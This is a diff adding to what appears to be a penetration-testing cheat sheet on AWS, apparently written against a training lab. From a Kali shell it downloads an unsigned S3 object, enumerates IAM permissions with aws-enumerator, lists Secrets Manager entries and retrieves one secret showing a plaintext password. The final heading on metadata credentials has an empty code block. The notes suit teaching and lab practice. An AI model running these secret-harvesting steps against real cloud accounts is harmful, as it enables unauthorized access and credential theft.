@@ -1030,8 +1030,63 @@ To copy S3 files to the local system without using a browser
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
 download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip
+```
+
+Run <a href="https://github.com/shabarkin/aws-enumerator">aws-enumerator</a> to enumerate permissions against services
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws-enumerator enum -services all                                                                                                                
+Message:  Successful APPMESH: 0 / 1
+Message:  Successful APPSYNC: 0 / 1
+<snip>
+Message:  Successful SECRETSMANAGER: 1 / 2
+```
+
+And to dump permissions on a specific service
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws-enumerator dump -services secretsmanager
+-------------------------------------------------- SECRETSMANAGER --------------------------------------------------
+ListSecrets
+```
+
+To request secretsmanager to list secrets
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws secretsmanager list-secrets
+{
+    "SecretList": [
+        {
+            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z",
+            "Name": "employee-database-admin",
+            "Description": "Admin access to MySQL employee database",
+            "LastChangedDate": "2023-07-12T14:15:38.909000-04:00",
+<snip>
+```
+
+To fetch a secret by name
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws secretsmanager get-secret-value --secret-id ext/cost-optimization
+{
+    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
+    "Name": "ext/cost-optimization",
+    "VersionId": "f7d6ae91-5afd-4a53-93b9-92ee74d8469c",
+    "SecretString": "{\"Username\":\"ext-cost-user\",\"Password\":\"K33pOurCostsOptimized!!!!\"}",
+    "VersionStages": [
+        "AWSCURRENT"
+    ],
+    "CreatedDate": "2023-08-04T17:19:28.512000-04:00"
+}
+```
+To get credentials from metadata, including the session token 
+```
+
 
 ```
+
+
+
 
 
 
